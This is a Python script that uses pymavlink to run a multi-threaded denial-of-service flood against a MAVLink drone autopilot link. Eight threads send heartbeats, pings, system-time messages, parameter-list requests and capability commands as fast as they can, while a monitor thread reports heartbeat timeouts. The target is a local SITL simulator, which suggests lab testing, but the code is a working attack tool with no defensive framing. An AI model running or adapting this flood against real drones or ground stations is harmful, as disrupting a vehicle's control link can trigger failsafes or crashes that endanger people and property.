from pymavlink import mavutil
import time
import threading
import random

# Global attack control
attack_active = True
total_sent = 0
lock = threading.Lock()

def attack_thread(thread_id, master):
    """Individual attack thread - sends at maximum rate"""
    global total_sent
    local_count = 0
    
    print(f"Attack thread {thread_id} started")
    
    while attack_active:
        try:
            # Send multiple message types rapidly
            master.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                0, 0, 0
            )
            
            # Flood with ping messages
            master.mav.ping_send(
                int(time.time() * 1000000),
                local_count % 256,
                1, 1
            )
            
            # System time spam
            master.mav.system_time_send(
                int(time.time() * 1000000), 0
            )
            
            # Parameter requests (resource intensive)
            master.mav.param_request_list_send(1, 1)
            
            # Command spam
            master.mav.command_long_send(
                1, 1,
                mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
                0, 0, 0, 0, 0, 0, 0, 0
            )
            
            local_count += 5
            
            with lock:
                total_sent += 5
                
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            break
    
    print(f"Attack thread {thread_id} stopped - sent {local_count} messages")

def monitor_thread(master):
    """Monitor system responses and connection status"""
    last_heartbeat = time.time()
    msg_count = 0
    
    while attack_active:
        msg = master.recv_match(timeout=0.1)
        if msg:
            msg_count += 1
            if msg.get_type() == 'HEARTBEAT':
                last_heartbeat = time.time()
                
        # Check for link timeout
        if time.time() - last_heartbeat > 5:
            print(f"⚠️  LINK TIMEOUT DETECTED - No heartbeat for {time.time() - last_heartbeat:.1f}s")
            last_heartbeat = time.time()  # Reset to avoid spam
            
        if msg_count % 50 == 0 and msg_count > 0:
            print(f"  [Monitor] Received {msg_count} responses")

# Main attack execution
print("🔥 MAXIMUM POWER DoS ATTACK 🔥")
print("Connecting to SITL...")

try:
    master = mavutil.mavlink_connection('udpin:127.0.0.1:14550')
    master.wait_heartbeat()
    print(f"Connected! System {master.target_system}, Component {master.target_component}")
    
    # Start monitoring thread
    monitor = threading.Thread(target=monitor_thread, args=(master,))
    monitor.daemon = True
    monitor.start()
    
    # Launch multiple attack threads
    num_threads = 8  # Increase for more power
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack_thread, args=(i, master))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    print(f"🚀 {num_threads} attack threads launched!")
    print("Monitor MAVProxy for link drops. Press Ctrl+C to stop.")
    
    start_time = time.time()
    while True:
        time.sleep(2)
        elapsed = time.time() - start_time
        rate = total_sent / elapsed if elapsed > 0 else 0
        print(f"💥 Total sent: {total_sent:,} messages at {rate:.0f} msg/sec")
        
except KeyboardInterrupt:
    print("\n🛑 Stopping maximum power attack...")
    attack_active = False
    time.sleep(1)  # Let threads finish
    
    elapsed = time.time() - start_time
    avg_rate = total_sent / elapsed if elapsed > 0 else 0
    print(f"\nFinal Stats:")
    print(f"  Total messages: {total_sent:,}")
    print(f"  Duration: {elapsed:.1f} seconds")
    print(f"  Average rate: {avg_rate:,.0f} msg/sec")
    
except Exception as e:
    print(f"Connection error: {e}")
    attack_active = False
